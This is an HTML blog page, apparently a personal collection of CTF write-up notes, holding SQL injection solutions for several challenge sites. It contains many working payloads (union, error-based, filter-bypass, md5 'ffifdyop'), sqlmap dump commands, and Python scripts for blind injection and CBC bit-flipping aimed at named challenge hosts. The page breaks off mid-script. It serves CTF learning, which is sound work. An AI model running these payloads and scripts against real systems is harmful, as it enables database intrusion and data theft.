@@ -1,0 +1,766 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="bugku 神奇登陆框test by error report ,and find 1”12341&amp;quot; order by 21&amp;quot; union select group_concat(table_name),1 from information_schema.tables where table_schema=&amp;quot;bugkusql1&amp;quot;--+1&amp;quot; unio">
+<meta name="keywords" content="CTF WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL 题型记录">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/SQL-题型记录/index.html">
+<meta property="og:site_name" content="CH4SER&#39;ZONE">
+<meta property="og:description" content="bugku 神奇登陆框test by error report ,and find 1”12341&amp;quot; order by 21&amp;quot; union select group_concat(table_name),1 from information_schema.tables where table_schema=&amp;quot;bugkusql1&amp;quot;--+1&amp;quot; unio">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-04-23T03:27:45.599Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SQL 题型记录">
+<meta name="twitter:description" content="bugku 神奇登陆框test by error report ,and find 1”12341&amp;quot; order by 21&amp;quot; union select group_concat(table_name),1 from information_schema.tables where table_schema=&amp;quot;bugkusql1&amp;quot;--+1&amp;quot; unio">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/SQL-题型记录/">
+
+
+
+
+
+  <title>SQL 题型记录 | CH4SER'ZONE</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CH4SER'ZONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">The quieter you become, the more you are able to hear</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/SQL-题型记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/40637063.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CH4SER'ZONE">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SQL 题型记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T01:43:42+00:00">
+                2019-04-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/题型记录/" itemprop="url" rel="index">
+                    <span itemprop="name">题型记录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="bugku-神奇登陆框"><a href="#bugku-神奇登陆框" class="headerlink" title="bugku 神奇登陆框"></a>bugku 神奇登陆框</h2><p>test by error report ,and find 1”<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&quot; order by 2</span><br><span class="line">1&quot; union select group_concat(table_name),1 from information_schema.tables where table_schema=&quot;bugkusql1&quot;--+</span><br><span class="line">1&quot; union select group_concat(column_name),1 from information_schema.columns where table_name=&quot;flag1&quot;--+</span><br><span class="line">1&quot; union select group_concat(flag1),1 from bugkusql1.flag1 --+</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>use sqlmap to solve this:<br>use burpsuite to copy a request to a txt file first</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlmap -r&quot;the path of txtfile&quot; -p admin_name --dbs</span><br><span class="line">sudo sqlmap -r&quot;the path of txtfile&quot; -D bugkusql1 -p admin_name --tables</span><br><span class="line">sudo sqlmap -r&quot;the path of txtfile&quot; -D bugkusql1 -T flag1 -p admin_name --columns</span><br><span class="line">sudo sqlmap -r&quot;the path of txtfile&quot; -D bugkusql1 -T flag1 -C flag1 -p admin_name --dump</span><br></pre></td></tr></table></figure>
+<p>get the flag</p>
+<h2 id="多次"><a href="#多次" class="headerlink" title="多次"></a>多次</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1&apos;</span><br><span class="line">1&quot;</span><br><span class="line">1&apos;--+</span><br><span class="line">1&quot;--+</span><br><span class="line">1&apos;^(0)--+</span><br><span class="line">1&apos;^(1)--+</span><br><span class="line">1&apos;^(length(&apos;select&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;union&apos;)&gt;0)--+</span><br><span class="line">1&apos;^(length(&apos;or&apos;)&gt;0)--+</span><br><span class="line">.........</span><br><span class="line">-1&apos; uniunionon selselectect 1,2 --+</span><br><span class="line">-1&apos; uniunionon selselectect 1,database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;flag1&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name=&apos;hint&apos;--+</span><br><span class="line">-1&apos; uniunionon selselectect 1,group_concat(flag1,&quot; :: &quot;,address) from flag1--+</span><br></pre></td></tr></table></figure>
+<p>and we get the second address</p>
+<h2 id="sql注入2"><a href="#sql注入2" class="headerlink" title="sql注入2"></a>sql注入2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python ds_store_exp http://123.206.87.240:8007/web2/.DS_Store</span><br><span class="line">curl http://123.206.87.240:8007/web2/flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">url=&apos;http://123.206.87.240:8007/web2/login.php&apos;</span><br><span class="line">checkdic=[&apos;and&apos;,&apos;union&apos;,&apos;or&apos;,&apos;+&apos;,&apos;-&apos;,&apos;select&apos;,&apos;^&apos;,&apos;substr&apos;,&apos;ord&apos;,&apos;str&apos;,\</span><br><span class="line">    &apos;reverse&apos;,&apos;from&apos;,&apos;for&apos;,&apos;information_schema&apos;,\</span><br><span class="line">    &apos;name&apos;,&apos;*&apos;,&apos;where&apos;,&apos;column&apos;,&apos;sleep&apos;,&quot;&apos;&quot;,&apos;(&apos;,&quot;)&quot;,&apos;--&apos;,&apos;#&apos;,&apos; &apos;,&apos;,&apos;]</span><br><span class="line">#cookies=&#123;&apos;PHPSESSID&apos;:&apos;b9dgo66maafuo16jo22kidiglskvcvr6&apos;&#125;</span><br><span class="line">sql=&quot;admin&apos;-(mid((reverse(mid((passwd)from(-&#123;0&#125;))))from(-1))=&apos;&#123;1&#125;&apos;)-&apos;&quot;</span><br><span class="line"># for i in range(len(checkdic)):</span><br><span class="line">#     uname=checkdic[i]</span><br><span class="line">#     passwd=&apos;ch4ser&apos;</span><br><span class="line">#     data=&#123;&apos;uname&apos;:uname,&apos;passwd&apos;:passwd&#125;</span><br><span class="line">#     responce=requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">#     if &apos;illegal character!!@_@&apos; in responce.text:</span><br><span class="line">#         print &apos;%s is illegal&apos;%checkdic[i]</span><br><span class="line">flag=&apos;&apos;</span><br><span class="line">for i in range(1,40):</span><br><span class="line">    for j in &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;:</span><br><span class="line">        print i,j</span><br><span class="line">        sqli=sql.format(str(i),j)</span><br><span class="line">        data=&#123;&apos;uname&apos;:sqli,&apos;passwd&apos;:&apos;ch4ser&apos;&#125;</span><br><span class="line">        responce=requests.post(url,data=data)</span><br><span class="line"></span><br><span class="line">        if &apos;user&apos; in responce.content:</span><br><span class="line">            flag+=j</span><br><span class="line">            print flag</span><br></pre></td></tr></table></figure>
+<h2 id="ichunqiu-SQL"><a href="#ichunqiu-SQL" class="headerlink" title="ichunqiu SQL"></a>ichunqiu SQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://www.ichunqiu.com/battalion?q=2619</span><br><span class="line">https://www.ichunqiu.com/writeup/detail/1845</span><br></pre></td></tr></table></figure>
+<p>关于为什么不需要闭合的原因，因为是id，id是int类型的，默认情况下就是where id=(数字)，因此不需要闭合，除非有额外处理，都是要试出来的</p>
+<blockquote>
+<p>小插入：在mysql5.7 以上版本中，select from users limit 1 union select from (select 1)a join (select 2)b join (select 3)c;已经不能使用了；<br>取而代之的是：(select from users limit 1) union (select from (select 1)a join (select 2)b join (select 3)c);</p>
+</blockquote>
+<h2 id="shiyan-club-login-background"><a href="#shiyan-club-login-background" class="headerlink" title="shiyan-club login background"></a>shiyan-club login background</h2><p>we can detect that many keywords are filtered,like ‘union’, ‘=’(so use ‘regexp’),’substr’,’mid’,and so on.</p>
+<p>based on exp-error<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema regexp database())a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(colunm_name) from informaion_schema.columns where table_name regexp &apos;ffll44jj&apos;)a))) or &apos;</span><br><span class="line">username=1&amp;password=1&apos; or (exp(~(select * from (select group_concat(value) from ff1144jj)a))) or &apos;</span><br></pre></td></tr></table></figure></p>
+<p>based on xml-error<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">xmlupdate and extractvalue</span><br><span class="line"></span><br><span class="line">username=1&apos; or/*&amp;password=&apos;*/extractvalue(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*this require did not work</span><br><span class="line"></span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*but the responce is &quot;SELECT command denied to user &apos;web8&apos;@&apos;localhost&apos; for table &apos;tables&apos;&quot;</span><br><span class="line">/*syntax error*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()))or&apos;</span><br><span class="line">/*works but strangly , the first table_name do not show*/</span><br><span class="line">username=1&apos; or extractvalue/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database())))or&apos;</span><br><span class="line">/*works and show all the table_name*/</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username=1&apos; or updatexml/*&amp;password=&apos;*/(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema regexp database()),0x7e),1)or&apos;</span><br><span class="line">/*works ,same problem happend when delete &apos;0x7e&apos;*/</span><br></pre></td></tr></table></figure>
+<h2 id="shiyanbar-登陆一下好吗？"><a href="#shiyanbar-登陆一下好吗？" class="headerlink" title="shiyanbar 登陆一下好吗？"></a>shiyanbar 登陆一下好吗？</h2><p>payload1:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username:&apos;=&apos;</span><br><span class="line">password:&apos;=&apos;</span><br><span class="line">语句为：select flag from xxx where username=&apos;&apos;=&apos;&apos; and password=&apos;&apos;=&apos;&apos;;</span><br></pre></td></tr></table></figure></p>
+<p>payload2:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username:b&apos;+0;%00</span><br><span class="line">username 在burpsuite中改，%00在burpsuite中是%2500,变成%00,其他不变就可以了</span><br><span class="line">password:1</span><br><span class="line"># 语句为：select flag from xxx where username=&apos;a&apos;+0;%00&apos;and password=&apos;1&apos;;</span><br></pre></td></tr></table></figure></p>
+<h2 id="md5注入"><a href="#md5注入" class="headerlink" title="md5注入"></a>md5注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;ffifdyop&apos;这个东西在md5之后的值的开头为 &apos;or&apos;&lt;trash&gt; 可以有效绕过一些东西</span><br></pre></td></tr></table></figure>
+<h2 id="cbc-字节翻转攻击注入"><a href="#cbc-字节翻转攻击注入" class="headerlink" title="cbc 字节翻转攻击注入"></a>cbc 字节翻转攻击注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">def denglu(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    payload = &#123;&apos;id&apos;: payload&#125;</span><br><span class="line">    r = requests.post(url, data=payload)</span><br><span class="line">    Set_Cookie=r.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv=re.findall(r&quot;iv=(.*?),&quot;, Set_Cookie)[0]</span><br><span class="line">    cipher=re.findall(r&quot;cipher=(.*)&quot;, Set_Cookie)[0]</span><br><span class="line">    iv_raw = b64decode(urllib.unquote(iv))</span><br><span class="line">    cipher_raw=b64decode(urllib.unquote(cipher))</span><br><span class="line">    lst=list(cipher_raw)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    cipher_new=&apos;&apos;.join(lst)</span><br><span class="line">    cipher_new=urllib.quote(b64encode(cipher_new))</span><br><span class="line">    cookie_new=&#123;&apos;iv&apos;: iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    cont=r.content</span><br><span class="line">    plain = re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;, cont)[0]</span><br><span class="line">    plain = b64decode(plain)</span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new += chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new = urllib.quote(b64encode(iv_new))</span><br><span class="line">    cookie_new = &#123;&apos;iv&apos;: iv_new, &apos;cipher&apos;: cipher_new&#125;</span><br><span class="line">    r = requests.post(url, cookies=cookie_new)</span><br><span class="line">    rcont = r.content</span><br><span class="line">    print rcont</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">denglu(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">denglu(&quot;0 2nion select * from((select 1)a join (select * from you_want)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br></pre></td></tr></table></figure>
+<h2 id="实验吧的一道二分注入"><a href="#实验吧的一道二分注入" class="headerlink" title="实验吧的一道二分注入"></a>实验吧的一道二分注入</h2><p>这道题把<code>空格</code>和<code>’or’</code>过滤了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &apos;http://ctf5.shiyanbar.com/web/earnest/index.php&apos;</span><br><span class="line"></span><br><span class="line">def len_detect(sql):</span><br><span class="line">    for i in range(70):</span><br><span class="line">        data = &#123;&quot;id&quot;:sql.format(str(i))&#125;</span><br><span class="line">        res = requests.post(url,data=data)</span><br><span class="line">        if &apos;not&apos; in res.content:</span><br><span class="line">            continue</span><br><span class="line">        else:</span><br><span class="line">            print &quot;[*] length of target is %d&quot; % i</span><br><span class="line">            return i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def sql_inject_name(sql,len):</span><br><span class="line">    name = &apos;&apos;</span><br><span class="line">    for i in range(1,len+1):</span><br><span class="line">        l_bound = 0; u_bound = 255</span><br><span class="line">        while l_bound &lt;= u_bound:</span><br><span class="line">            m_bound = (l_bound + u_bound)/2</span><br><span class="line">            data = &#123;&quot;id&quot;:sql.format(str(i),(m_bound))&#125;</span><br><span class="line">            res = requests.post(url,data=data)</span><br><span class="line">            if &apos;not&apos; in res.content:</span><br><span class="line">                u_bound = m_bound - 1</span><br><span class="line">                tmp = m_bound</span><br><span class="line">                </span><br><span class="line">            else:</span><br><span class="line">                l_bound = m_bound + 1</span><br><span class="line">                </span><br><span class="line">        name += chr(tmp)</span><br><span class="line">        print name</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">db_len = &quot;0&apos;oorr(length(database())=&#123;&#125;)oorr&apos;0&quot;</span><br><span class="line">db_name = &quot;0&apos;oorr(((oorrd(mid((database())from(&#123;&#125;)foorr(1))))&gt;&#123;&#125;))oorr&apos;0&quot;</span><br><span class="line">tb_len = &quot;0&apos;oorr(length((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=&apos;ctf_sql_bool_blind&apos;))=&#123;&#125;)oorr&apos;0&quot;</span><br><span class="line">tb_name = &quot;0&apos;oorr((oorrd(mid((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database()))from(&#123;&#125;)foorr(1)))&gt;&#123;&#125;))oorr&apos;0&quot;</span><br><span class="line">column_len = &quot;0&apos;oorr(length((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)=&apos;fiag&apos;))=&#123;&#125;)oorr&apos;0&quot;</span><br><span class="line">column_name = &quot;0&apos;oorr(oorrd(mid((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&apos;fiag&apos;))from(&#123;&#125;)foorr(1)))&gt;&#123;&#125;)oorr&apos;0&quot;</span><br><span class="line">flag_len = &quot;0&apos;oorr(length((select(group_concat(fL$4G))from(fiag)))=&#123;&#125;)oorr&apos;0&quot;</span><br><span class="line">flag = &quot;0&apos;oorr(oorrd(mid((select(group_concat(fL$4G))from(fiag))from(&#123;&#125;)foorr(1)))&gt;&#123;&#125;)oorr&apos;0&quot;</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    a = time.time()</span><br><span class="line">    #sql_inject_name(column_name,len_detect(column_len))</span><br><span class="line">    #sql_inject_name(db_name,18)</span><br><span class="line">    sql_inject_name(flag,len_detect(flag_len))</span><br><span class="line">    print &quot;time used:&quot;,time.time() - a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<h2 id="2018xmas-的一道基于useragent的二分盲注"><a href="#2018xmas-的一道基于useragent的二分盲注" class="headerlink" title="2018xmas 的一道基于useragent的二分盲注"></a>2018xmas 的一道基于useragent的二分盲注</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">import requests,time</span><br><span class="line"></span><br><span class="line">_URL_=&apos;xxxxxxxxxx&apos;</span><br><span class="line"></span><br><span class="line">def getResponse(html):</span><br><span class="line">    soup     = BeautifulSoup(html,&apos;lxml&apos;)</span><br><span class="line">    response = soup.findAll(&apos;p&apos;)[3].getText()</span><br><span class="line">    return True if &apos;Welcome!&apos; in response else False</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def BindSQLinjection(column,table):</span><br><span class="line">    pos = 1</span><br><span class="line">    flag = &apos;&apos;</span><br><span class="line">    </span><br><span class="line">    while True:</span><br><span class="line">        l_bound = 0;u_bound = 255</span><br><span class="line">        while l_bound &lt;= u_bound:</span><br><span class="line">            m_bound =(l_bound+u_bound)/2</span><br><span class="line">            header  =&#123;&apos;User-Agent&apos;:&quot;&apos; or (selct ascii(substr((select &#123;&#125; from 